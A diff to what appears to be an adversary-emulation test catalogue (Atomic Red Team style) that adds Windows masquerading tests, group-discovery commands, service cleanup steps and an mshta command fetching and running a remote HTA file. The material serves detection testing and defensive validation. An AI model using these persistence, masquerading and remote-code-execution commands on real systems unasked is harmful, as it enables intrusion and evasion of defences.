@@ -3028,6 +3028,7 @@ persistence:
         command: |
           sc.exe create #{service_name} binPath= #{binary_path}
           sc.exe start #{service_name}
+        cleanup_command: |
           sc.exe stop #{service_name}
           sc.exe delete #{service_name}
     - name: Service Installation PowerShell Installs A Local Service using PowerShell
@@ -3051,6 +3052,7 @@ persistence:
         command: |
           New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
           Start-Service -Name "#{service_name}"
+        cleanup_command: |
           Stop-Service -Name "#{service_name}"
           (Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()
   T1137:
@@ -8540,6 +8542,56 @@ defense-evasion:
         cleanup_command: 'del /Q /F %APPDATA%\taskhostw.exe
 
 '
+    - name: Masquerading - non-windows exe running as windows exe
+      description: 'Copies an exe, renames it as a windows exe, and launches it to
+        masquerade as a real windows exe
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        inputfile:
+          description: path of file to copy
+          type: path
+          default: "$PathToAtomicsFolder\\T1036\\bin\\t1036.exe"
+        outputfile:
+          description: path of file to execute
+          type: path
+          default: ($env:SystemRoot + "\Temp\scvhost.exe")
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          copy #{inputfile} #{outputfile}
+          $myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
+          Stop-Process -ID $myT1036
+        cleanup_command: 'del #{outputfile}
+
+'
+    - name: Masquerading - windows exe running as different windows exe
+      description: 'Copies a windows exe, renames it as another windows exe, and launches
+        it to masquerade as second windows exe
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        inputfile:
+          description: path of file to copy
+          type: path
+          default: "$env:ComSpec"
+        outputfile:
+          description: path of file to execute
+          type: path
+          default: ($env:SystemRoot + "\Temp\scvhost.exe")
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          copy #{inputfile} #{outputfile}
+          $myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
+          Stop-Process -ID $myT1036
+        cleanup_command: 'del #{outputfile}'
   T1112:
     technique:
       x_mitre_data_sources:
@@ -8863,7 +8915,23 @@ defense-evasion:
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")'
+          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+
+'
+    - name: Mshta Executes Remote HTML Application (HTA)
+      description: 'Execute an arbitrary remote HTA.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        hta_url:
+          description: URL to HTA file for execution
+          type: string
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.hta
+      executor:
+        name: command_prompt
+        command: 'mshta #{hta_url}'
   T1096:
     technique:
       x_mitre_data_sources:
@@ -12411,6 +12479,7 @@ privilege-escalation:
         command: |
           sc.exe create #{service_name} binPath= #{binary_path}
           sc.exe start #{service_name}
+        cleanup_command: |
           sc.exe stop #{service_name}
           sc.exe delete #{service_name}
     - name: Service Installation PowerShell Installs A Local Service using PowerShell
@@ -12434,6 +12503,7 @@ privilege-escalation:
         command: |
           New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
           Start-Service -Name "#{service_name}"
+        cleanup_command: |
           Stop-Service -Name "#{service_name}"
           (Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()
   T1150:
@@ -15469,6 +15539,48 @@ discovery:
       modified: '2019-10-18T20:37:17.043Z'
       identifier: T1069
     atomic_tests:
+    - name: Permission Groups Discovery
+      description: 'Permission Groups Discovery
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      executor:
+        name: sh
+        command: |
+          dscacheutil -q group
+          dscl . -list /Groups
+          groups
+    - name: Basic Permission Groups Discovery Windows
+      description: 'Basic Permission Groups Discovery for Windows
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          net localgroup
+          net group /domain
+    - name: Permission Groups Discovery PowerShell
+      description: 'Permission Groups Discovery utilizing PowerShell
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        user:
+          description: User to identify what groups a user is a member of
+          type: string
+          default: administrator
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          get-localgroup
+          get-ADPrinicipalGroupMembership #{user} | select name
     - name: Elevated group enumeration using net group
       description: 'Runs ''net group'' command including command aliases and loose
         typing to simulate enumeration/discovery of high value domain groups
@@ -19352,7 +19464,23 @@ execution:
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")'
+          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+
+'
+    - name: Mshta Executes Remote HTML Application (HTA)
+      description: 'Execute an arbitrary remote HTA.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        hta_url:
+          description: URL to HTA file for execution
+          type: string
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.hta
+      executor:
+        name: command_prompt
+        command: 'mshta #{hta_url}'
   T1086:
     technique:
       x_mitre_permissions_required:
